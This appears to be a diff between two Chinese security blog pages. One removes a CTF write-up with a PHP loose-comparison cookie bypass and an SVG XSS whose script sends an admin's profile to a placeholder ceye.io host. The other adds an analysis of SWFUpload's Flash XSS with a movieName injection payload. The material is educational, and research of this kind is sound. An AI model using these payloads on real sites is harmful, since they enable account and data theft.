@@ -16,35 +16,22 @@
 
 
 <meta name="description" content="已完结.">
-<meta name="keywords" content="Web安全">
+<meta name="keywords" content="Web安全,XSS,Flash">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Teaser CONFidence CTF Web writeup">
-<meta property="og:url" content="https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/index.html">
+<meta property="og:title" content="SWFUpload.swf的Flash型XSS分析">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/07/31/SWFUpload-swf的Flash型XSS分析/index.html">
 <meta property="og:site_name" content="Mi1k7ea">
 <meta property="og:description" content="已完结.">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/1.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/2.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/3.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/4.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/5.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/6.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/7.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/8.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/9.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/10.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/11.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/12.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/13.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/14.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/15.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/16.png">
-<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/17.png">
-<meta property="og:updated_time" content="2019-05-28T14:21:58.013Z">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/31/SWFUpload-swf的Flash型XSS分析/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/31/SWFUpload-swf的Flash型XSS分析/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/31/SWFUpload-swf的Flash型XSS分析/3.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/07/31/SWFUpload-swf的Flash型XSS分析/4.png">
+<meta property="og:updated_time" content="2019-07-31T14:24:03.606Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Teaser CONFidence CTF Web writeup">
+<meta name="twitter:title" content="SWFUpload.swf的Flash型XSS分析">
 <meta name="twitter:description" content="已完结.">
-<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/1.png">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/07/31/SWFUpload-swf的Flash型XSS分析/1.png">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -76,7 +63,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Teaser CONFidence CTF Web writeup | Mi1k7ea</title>
+<title>SWFUpload.swf的Flash型XSS分析 | Mi1k7ea</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -266,11 +253,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-Teaser-CONFidence-CTF-Web-writeup" class="article article-type-post" itemscope="" itemprop="blogPost">
+      <div class="body-wrap"><article id="post-SWFUpload-swf的Flash型XSS分析" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/" class="article-date">
-      <time datetime="2019-03-21T11:58:22.000Z" itemprop="datePublished">2019-03-21</time>
+      <a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/" class="article-date">
+      <time datetime="2019-07-31T13:35:24.000Z" itemprop="datePublished">2019-07-31</time>
 </a>
 
 
@@ -285,7 +272,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Teaser CONFidence CTF Web writeup
+      SWFUpload.swf的Flash型XSS分析
     </h1>
   
 
@@ -294,13 +281,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/WriteUp-Web/">WriteUp:Web</a>
+    <a class="article-category-link" href="/categories/Web安全基础/">Web安全基础</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Flash/">Flash</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -310,67 +297,29 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>这次Web题只做了前两道，最后一道GO的题目不会就没做了。</p>
-<h2 id="My-admin-panel"><a href="#My-admin-panel" class="headerlink" title="My admin panel"></a>My admin panel</h2><p>题目地址：<a href="http://gameserver.zajebistyc.tf/" target="_blank" rel="noopener">http://gameserver.zajebistyc.tf/</a></p>
-<p>题目描述：I think I’ve found something interesting, but I’m not really a PHP expert. Do you think it’s exploitable?</p>
-<p>访问该页面，是个登录界面，可以下载客户端包：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/1.png" alt=""></p>
-<p>下载该包下来，解压打开看，发现全是C/C++代码，和本题提示的PHP无关，因此点一个不在这。</p>
-<p>尝试随便输入登录，发现无论输入啥都是返回Done界面：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/2.png" alt=""></p>
-<p>这样的话也没办法进行SQL注入和盲注了，因为无论输入什么内容返回内容都一样。</p>
-<p>那就尝试用工具扫下Web站点下隐藏的页面，果不其然：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/3.png" alt=""></p>
-<p>一个个访问，login.php返回”Not authenticated.”，其他文件无显示，访问admin目录，存在一个login.php.bak备份文件：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/4.png" alt=""></p>
-<p>下载下来，代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../func.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_COOKIE[<span class="string">'otadmin'</span>]) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"Not authenticated.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^&#123;"hash": [0-9A-Z\"]+&#125;$/'</span>, $_COOKIE[<span class="string">'otadmin'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session_data = json_decode($_COOKIE[<span class="string">'otadmin'</span>], <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($session_data === <span class="keyword">NULL</span>) &#123; <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>; <span class="keyword">exit</span>(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($session_data[<span class="string">'hash'</span>] != strtoupper(MD5($cfg_pass))) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"I CAN EVEN GIVE YOU A HINT XD \n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">display_admin();</span><br></pre></td></tr></table></figure>
-<p>分析一下，先判断cookie字段是否存在otadmin属性；然后正则判断otadmin是否满足指定json格式的内容；提取出hash键值和$cfg_pass变量的MD5值进行比较，当不相等时输出一段经过运算后的提示信息。</p>
-<p>注意，<code>if ($session_data[&#39;hash&#39;] != strtoupper(MD5($cfg_pass))) {</code>这里用的比较符是!=，按照习惯会想到是PHP弱类型。</p>
-<p>随便填otadmin的内容发过去/admin/login.php看看，注意cookie值的构造要满足前面正则的匹配：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/5.png" alt=""></p>
-<p>这里返回了一串经过运算处理后的内容：</p>
-<p>0006464640640064000646464640006400640640646400</p>
-<p>分析一下，只有0/6/4这几个数字。将运算的那段代码扣下来本地运行一下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cfg_pass=<span class="string">"Hello666"</span>;</span><br><span class="line"><span class="keyword">echo</span> MD5($cfg_pass);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); $i++) &#123;</span><br><span class="line">	<span class="comment">// echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0);</span></span><br><span class="line">	<span class="keyword">echo</span> MD5($cfg_pass)[$i];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> ord(MD5($cfg_pass)[$i]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;-------------&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>随便给$cfg_pass变量赋值，然后运行观察，MD5值没啥好说的，到for循环后，先输出MD5的每一位，然后对其调用ord()函数取该字符对于的ASCII码，最后再和0xC0进行&amp;与运算：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/6.png" alt=""></p>
-<p>可以看到，最后&amp;与运算的结果不是0就是64，那就写个小脚本确认一下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">127</span>):</span><br><span class="line">	print(str(x)+<span class="string">":"</span>+str(x&amp;<span class="number">0xC0</span>))</span><br></pre></td></tr></table></figure>
-<p>运行这段代码会发现，1-63与运算后为0，64以后与运算后为64。我们知道，数字0-9的ASCII码为48-57，即数字与运算后结果均为0，而字母A-Za-z的ASCII码都大于64，即字母与运算后结果均为64。</p>
-<p>那么就很明确了，再看看页面返回的值：</p>
-<p>0006464640640064000646464640006400640640646400</p>
-<p>前面3位是0，后面接着是字母结合数字的混合体。</p>
-<p>这时就可以祭出弱类型了，我们知道<code>123==&quot;123aivmfsjoo90i1jj90i0i031&quot;</code>是恒成立的，因此剩下的问题就变成了只需要暴破该MD5的前3为数字即可绕过得到flag，最终爆破出的payload为<code>Cookie: otadmin={&quot;hash&quot;: 389}</code>：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/7.png" alt=""></p>
-<h2 id="Web-50"><a href="#Web-50" class="headerlink" title="Web 50"></a>Web 50</h2><p>题目地址：<a href="http://web50.zajebistyc.tf/login?next=%2F" target="_blank" rel="noopener">http://web50.zajebistyc.tf/login?next=%2F</a></p>
-<p>题目描述：idk what this site does, but you can put some secret, shoe size and report it to the admin…</p>
-<p>访问页面，是个登录界面：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/8.png" alt=""></p>
-<p>随便输入用户名和密码，进入了另一个界面：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/9.png" alt=""></p>
-<p>其中有两个链接，Profile为当前登录用户的信息设置界面，包括设置一些字段内容和上传头像功能：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/10.png" alt=""></p>
-<p>另一个Report a bug为向管理员报告bug链接的地方，由此推测是一道通过XSS窃取管理员cookie获取flag的题目：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/11.png" alt=""></p>
-<p>回到用户信息设置界面，尝试将URL栏的本用户alan改为admin，可以访问，但是没有显示用户Avatar头像和Secret字段，猜测flag可能藏在Secret字段中：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/12.png" alt=""></p>
-<p>回到本用户设置界面随意设置，发现图片只能上传100*100格式的，且对文件的Content-Type、后缀名以及文件内容前面部分进行了校验，一开始想上传一句话木马的，发现没有文件包含结合便无法利用。</p>
-<p>后面想了一下应该就是注入XSS然后将用户链接发过去让admin访问。</p>
-<p>写段测试代码，注意要设置宽度和高度均为100：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">baseProfile</span>=<span class="string">"full"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">polygon</span> <span class="attr">id</span>=<span class="string">"triangle"</span> <span class="attr">points</span>=<span class="string">"0,0 0,50 50,0"</span> <span class="attr">fill</span>=<span class="string">"#009900"</span> <span class="attr">stroke</span>=<span class="string">"#004400"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">alert(<span class="string">"Mi1k7ea"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>本地访问没问题：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/13.png" alt=""></p>
-<p>上传到Avatar：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/14.png" alt=""></p>
-<p>确认一下，访问该Avatar所在地址，没有问题，成功弹框：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/15.png" alt=""></p>
-<p>到report界面上报，说admin会查看，确认了就是通过XSS获取admin的敏感信息来获得flag：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/16.png" alt=""></p>
-<p>后面就修改一下JS代码，让admin访问自己的profile界面，因为其本身拥有对Secret字段的访问权，然后再通过JS实现XMLHttpRequest以POST形式发送过来，这样就可以得到它的Secret字段内容了：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">baseProfile</span>=<span class="string">"full"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">polygon</span> <span class="attr">id</span>=<span class="string">"triangle"</span> <span class="attr">points</span>=<span class="string">"0,0 0,50 50,0"</span> <span class="attr">fill</span>=<span class="string">"#009900"</span> <span class="attr">stroke</span>=<span class="string">"#004400"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">		xhr2.open(<span class="string">"POST"</span>, <span class="string">"http://XXXX.ceye.io/"</span>);</span></span><br><span class="line"><span class="undefined">		xhr2.send(xhr.responseText);</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">&#125;   </span></span><br><span class="line"><span class="javascript">xhr.open(<span class="string">"GET"</span>, <span class="string">"http://web50.zajebistyc.tf/profile/admin"</span>);</span></span><br><span class="line"><span class="javascript">xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">xhr.send();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>再次上传svg图像，将该Avatar地址上报给admin，然后到ceye中可收到flag：</p>
-<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/17.png" alt=""></p>
+        <h2 id="0x01-SWFUpload简介"><a href="#0x01-SWFUpload简介" class="headerlink" title="0x01 SWFUpload简介"></a>0x01 SWFUpload简介</h2><p>SWFUpload是一个客户端文件上传工具，最初由Vinterwebb.se开发，它通过整合Flash与JavaScript技术为Web开发者提供了一个具有丰富功能继而超越传统标签的文件上传模式。</p>
+<p>SWFUpload是在国内网站中使用得比较普遍的Flash插件。</p>
+<h2 id="0x02-Flash-XSS"><a href="#0x02-Flash-XSS" class="headerlink" title="0x02 Flash XSS"></a>0x02 Flash XSS</h2><p>当SWFUpload的版本&lt;= 时，会存在Flash XSS漏洞。</p>
+<p>漏洞版本下载地址：<a href="https://github.com/JoyChou93/FlashXss/tree/master/swfupload" target="_blank" rel="noopener">https://github.com/JoyChou93/FlashXss/tree/master/swfupload</a></p>
+<p>将文件下载下来后，反编译得到as源代码，可以看到脚本是有三个，这里先关注SWFUpload的代码：</p>
+<p><img src="/2019/07/31/SWFUpload-swf的Flash型XSS分析/1.png" alt=""></p>
+<p>SWFUpload的代码量略大，这里直接搜索外部参数输入的关键字，找到对应的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function SWFUpload()</span><br><span class="line">      &#123;</span><br><span class="line">         ...</span><br><span class="line">         this.movieName = root.loaderInfo.parameters.movieName;</span><br><span class="line">         this.flashReady_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].flashReady&quot;;</span><br><span class="line">         this.fileDialogStart_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileDialogStart&quot;;</span><br><span class="line">         this.fileQueued_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileQueued&quot;;</span><br><span class="line">         this.fileQueueError_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileQueueError&quot;;</span><br><span class="line">         this.fileDialogComplete_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].fileDialogComplete&quot;;</span><br><span class="line">         this.uploadStart_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadStart&quot;;</span><br><span class="line">         this.uploadProgress_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadProgress&quot;;</span><br><span class="line">         this.uploadError_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadError&quot;;</span><br><span class="line">         this.uploadSuccess_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadSuccess&quot;;</span><br><span class="line">         this.uploadComplete_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].uploadComplete&quot;;</span><br><span class="line">         this.debug_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].debug&quot;;</span><br><span class="line">         this.testExternalInterface_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].testExternalInterface&quot;;</span><br><span class="line">         this.cleanUp_Callback = &quot;SWFUpload.instances[\&quot;&quot; + this.movieName + &quot;\&quot;].cleanUp&quot;;</span><br><span class="line">         this.uploadURL = root.loaderInfo.parameters.uploadURL;</span><br><span class="line">         this.filePostName = root.loaderInfo.parameters.filePostName;</span><br><span class="line">         this.fileTypes = root.loaderInfo.parameters.fileTypes;</span><br><span class="line">         this.fileTypesDescription = root.loaderInfo.parameters.fileTypesDescription + &quot; (&quot; + this.fileTypes + &quot;)&quot;;</span><br><span class="line">         this.loadPostParams(root.loaderInfo.parameters.params);</span><br></pre></td></tr></table></figure>
+<p>这里看到好几个变量都是外界可控的，有一个很特别，就是movieName变量，它会被拼接到很多名为xx_Callback的变量值中。我们就跟踪下第一个名为flashReady_Callback变量看看是不是可调用的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(ExternalCall.Bool(this.testExternalInterface_Callback))</span><br><span class="line">&#123;</span><br><span class="line">	ExternalCall.Simple(this.flashReady_Callback);</span><br><span class="line">	this.hasCalledFlashReady = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，在后面的代码中会作为ExternalCall.Simple()函数的唯一参数传入调用。</p>
+<p>而ExternalCall.Simple()函数的定义是在另一个名为ExternalCall脚本中，我们到其中搜索看看：</p>
+<p><img src="/2019/07/31/SWFUpload-swf的Flash型XSS分析/2.png" alt=""></p>
+<p>bingo，是ExternalInterface.call()函数，且是第一个参数外部可控，妥妥的Flash XSS漏洞。</p>
+<p>理下思路，存在AS3形式的loaderInfo.parameters来传入外部参数movieName，且存在ExternalInterface.call()函数的第一个参数外部可控，结合导致Flash XSS。</p>
+<p>至于其他几个拼接的变量也是一样的分析。</p>
+<p>这里结合ExternalInterface.call()函数的第一个参数的payload的形式，稍微修改下来闭合前面拼接的格式即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?movieName=&quot;])&#125;catch(e)&#123;alert(&apos;mi1k7ea&apos;)&#125;;//</span><br></pre></td></tr></table></figure>
+<p>接着就是不停地弹框了：</p>
+<p><img src="/2019/07/31/SWFUpload-swf的Flash型XSS分析/3.png" alt=""></p>
+<p>在IE下调试，可以看到底层被恶意构造输入注入的执行的JS代码：</p>
+<p><img src="/2019/07/31/SWFUpload-swf的Flash型XSS分析/4.png" alt=""></p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://www.freebuf.com/sectool/108568.html" target="_blank" rel="noopener">Flash XSS检测脚本的简单实现</a></p>
 
       
     </div>
@@ -379,13 +328,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></p>
+        <p><span>本文标题:</span><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Mi1k7ea</a></p>
-        <p><span>发布时间:</span>2019-03-21, 19:58:22</p>
-        <p><span>最后更新:</span>2019-05-28, 22:21:58</p>
+        <p><span>发布时间:</span>2019-07-31, 21:35:24</p>
+        <p><span>最后更新:</span>2019-07-31, 22:24:03</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/" title="Teaser CONFidence CTF Web writeup">https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/　　作者: Mi1k7ea" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/" title="SWFUpload.swf的Flash型XSS分析">https://Mi1k7ea.github.com/2019/07/31/SWFUpload-swf的Flash型XSS分析/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://Mi1k7ea.github.com/2019/07/31/SWFUpload-swf的Flash型XSS分析/　　作者: Mi1k7ea" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -397,16 +346,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/22/图片XSS小结/">
-                    图片XSS小结
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2019/03/17/SpEL注入之javacon/">
-                    SpEL注入之javacon
+                <a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">
+                    ZeroClipboard.swf的Flash型XSS分析
                 </a>
             </div>
         
@@ -418,7 +361,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#My-admin-panel"><span class="toc-number">1.</span> <span class="toc-text">My admin panel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-50"><span class="toc-number">2.</span> <span class="toc-text">Web 50</span></a></li></ol>
